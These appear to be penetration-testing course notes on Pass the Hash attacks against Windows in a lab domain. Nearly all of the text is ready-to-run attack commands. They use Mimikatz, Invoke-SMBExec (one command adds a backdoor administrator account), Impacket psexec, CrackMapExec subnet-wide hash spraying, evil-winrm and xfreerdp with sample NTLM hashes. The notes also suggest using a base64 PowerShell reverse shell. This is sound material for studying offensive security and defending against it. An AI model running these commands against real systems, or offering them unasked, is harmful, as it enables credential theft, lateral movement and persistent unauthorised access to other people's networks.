# Pass the Hash with Mimikatz (Windows)
The first tool we will use to perform a Pass the Hash attack is [Mimikatz](https://github.com/gentilkiwi). Mimikatz has a module named sekurlsa::pth that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password. To use this module, we will need the following:

1) `/user` - The user name we want to impersonate.
2) `/rc4` or `/NTLM` - NTLM hash of the user's password.
3) `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
4) `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

**Pass the Hash from Windows Using Mimikatz:**
```bash
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

# Pass the Hash with PowerShell Invoke-TheHash (Windows)
Another tool we can use to perform Pass the Hash attacks on Windows is [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have **administrative** rights on the target computer. 

When using `Invoke-TheHash`, we have two options: **SMB** or **WMI** command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:

1) **Target** - Hostname or IP address of the target.
2) **Username** - Username to use for authentication.
3) **Domain** - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
4) **Hash** - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
5) **Command** - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

Following example command on powershell will create user and add it to local administrator command:
```bash
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/e08a278a-ad9b-49bd-8d3d-287ebef07549)

## Idea !
We can also use powershell reverse shell by base64, for that we just need to specify command after `-Command` flag

# Pass the Hash with Impacket (Linux)

**Pass the Hash with Impacket PsExec:**
```bash
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/6a425769-4131-4201-9f4a-767c994a5dcf)

**Pass the Hash with CrackMapExec (Linux):**
```bash
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```
## Tip !

_If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add `--local-auth` to our command. This method is helpful if we obtain a local administrator hash by dumping the local `SAM database` on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see `Pwn3d!`, it means that the user is a local administrator on the target computer. We can use the option `-x` to execute commands._

# Pass the Hash with evil-winrm (Linux)
```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```
Note: When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb

# Pass the Hash using RDP
```bash
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```
